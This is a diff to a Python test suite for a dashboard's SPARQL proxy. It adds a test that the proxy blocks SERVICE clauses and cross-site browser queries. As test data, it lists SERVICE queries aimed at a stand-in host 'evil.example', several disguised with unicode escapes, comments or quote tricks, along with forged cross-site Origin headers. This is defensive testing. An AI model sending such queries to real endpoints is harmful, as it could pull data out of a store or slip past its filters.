@@ -9,7 +9,9 @@ open to the dashboard's users:
   but `query` and the dataset it names (default-/named-graph-uri), with the
   caller's Accept and never their Authorization header (nor the store's
   access token, nor any other argument a caller sends);
-- every way of sending a SPARQL Update is refused before the store is asked;
+- every way of sending a SPARQL Update is refused before the store is asked,
+  and so is a SERVICE clause (the store would call another endpoint with its
+  data) and a query a browser sends from another site;
 - the store's answer comes back as it gave it, an error included, but never as
   HTML on the dashboard's origin;
 - without a query a browser gets the page and any other client a Service
@@ -204,15 +206,68 @@ def test_malformed_requests(c: Client, wg):
     resp.read()
     conn.close()
     assert resp.status == 411, resp.status
-    status, _h, data = c.request("POST", "/sparql", body="query=ASK%7B%7D",
-                                 headers={**FORM, "Content-Length": "fifteen"})
-    assert status == 400 and "not a number" in json.loads(data)["error"], (status, data)
+    for bogus in ("fifteen", "-1", "1_5", "+15"):
+        status, _h, data = c.request("POST", "/sparql", body="query=ASK%7B%7D",
+                                     headers={**FORM, "Content-Length": bogus})
+        assert status == 400 and "not a number" in json.loads(data)["error"], (bogus, status, data)
     assert not FakeStore.calls
     # An empty body is fine when the query rides in the URL.
     FakeStore.reply = (200, "application/sparql-results+json", b'{"boolean":true}')
     status, _h, _d = c.request("POST", "/sparql?query=ASK%7B%7D")
     assert status == 200 and len(FakeStore.calls) == 1, status
     print("ok - an empty, doubled, oversized, chunked or mislabelled request is refused")
+
+
+def test_nothing_leaves_through_the_store(c: Client):
+    """A SERVICE clause makes the store call another endpoint with its own
+    data, so it is refused, however it is spelled; what merely looks like it
+    is not. A query a browser sends from another site is refused too: that is
+    how a page the user visits would fire one with the user's credentials."""
+    calls_out = [
+        "SELECT * WHERE { SERVICE <http://evil.example/sparql> { ?s ?p ?o } }",
+        "select * { service silent <http://evil.example/> {} }",
+        "SELECT * { ?s ?p ?o.SERVICE <http://evil.example/> {} }",
+        "SELECT * { ?s ex:a\\# ?o . SERVICE <http://evil.example/> {} }",
+        "SELECT * { \\u0053ERVICE <http://evil.example/> {} }",
+        'SELECT * { ?s ?p "x\\u0022" SERVICE <http://evil.example/> {} "\\u0022" }',
+        "SELECT * { ?s ?p ?o } # a comment ends here\nSERVICE ?endpoint {}",
+    ]
+    for query in calls_out:
+        FakeStore.calls.clear()
+        status, _h, data = c.request("POST", "/sparql", body=urllib.parse.urlencode({"query": query}),
+                                     headers=FORM)
+        assert status == 403 and "SERVICE" in json.loads(data)["error"], (query, status)
+        assert not FakeStore.calls, f"reached the store: {query!r}"
+    looks_like_it = [
+        "SELECT ?service WHERE { ?s ?p ?service }",
+        "PREFIX ex: <http://ex/> SELECT * { ?s ex:service ?o ; ex:a.SERVICE ?x }",
+        'SELECT * { ?s ?p "customer service"@en , <http://ex/service> } # service',
+        "PREFIX schema: <http://schema.org/> SELECT * { ?s a schema:Service }",
+    ]
+    FakeStore.reply = (200, "application/sparql-results+json", b'{"head":{},"results":{"bindings":[]}}')
+    for query in looks_like_it:
+        FakeStore.calls.clear()
+        status, _h, _d = c.request("POST", "/sparql", body=urllib.parse.urlencode({"query": query}),
+                                   headers=FORM)
+        assert status == 200 and len(FakeStore.calls) == 1, (query, status)
+    here = f"http://127.0.0.1:{c.port}"
+    for headers in ({"Sec-Fetch-Site": "cross-site"}, {"Sec-Fetch-Site": "same-site"},
+                    {"Origin": "https://evil.example"}, {"Origin": "null"}):
+        FakeStore.calls.clear()
+        status, _h, _d = c.request("POST", "/sparql", body="query=ASK%7B%7D", headers={**FORM, **headers})
+        assert status == 403 and not FakeStore.calls, (headers, status)
+        status, _h, _d = c.request("GET", "/sparql?query=ASK%7B%7D", headers=headers)
+        assert status == 403 and not FakeStore.calls, (headers, status)
+    for headers in ({"Sec-Fetch-Site": "same-origin", "Origin": here}, {"Sec-Fetch-Site": "none"},
+                    {"Origin": here}, {}):
+        FakeStore.calls.clear()
+        status, _h, _d = c.request("POST", "/sparql", body="query=ASK%7B%7D", headers={**FORM, **headers})
+        assert status == 200 and len(FakeStore.calls) == 1, (headers, status)
+    # The page itself still opens from a link on another site.
+    status, _h, body = c.request("GET", "/sparql", headers={"Accept": "text/html",
+                                                            "Sec-Fetch-Site": "cross-site"})
+    assert status == 200 and b"<retinue-sparql-doc" in body, status
+    print("ok - SERVICE and cross-site queries are refused; look-alikes, programs and the page are not")
 
 
 def test_store_answers_pass_through_but_never_as_html(c: Client):
@@ -304,6 +359,7 @@ def main() -> int:
             test_every_protocol_form_of_a_query(c)
             test_updates_are_refused_before_the_store(c)
             test_malformed_requests(c, wg)
+            test_nothing_leaves_through_the_store(c)
             test_store_answers_pass_through_but_never_as_html(c)
             test_without_a_query_the_endpoint_describes_itself(c)
             test_store_down_is_a_502(c, wg, dead_port)
